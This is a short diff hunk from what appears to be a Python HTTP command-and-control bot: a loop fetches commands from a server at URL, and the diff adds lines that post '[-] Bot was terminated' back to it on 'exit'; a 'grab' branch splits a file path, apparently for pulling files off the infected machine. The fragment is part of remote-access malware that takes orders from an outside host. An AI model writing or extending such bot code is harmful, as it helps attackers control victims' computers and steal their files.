@@ -28,6 +28,8 @@ while(True):
         command = req.text
         print("command ", command)
         if 'exit' in command:
+            msg = "[-] Bot was terminated"
+            requests.post(URL, data=msg)
             break
         elif 'grab' in command:
             command, path = command.split("*")
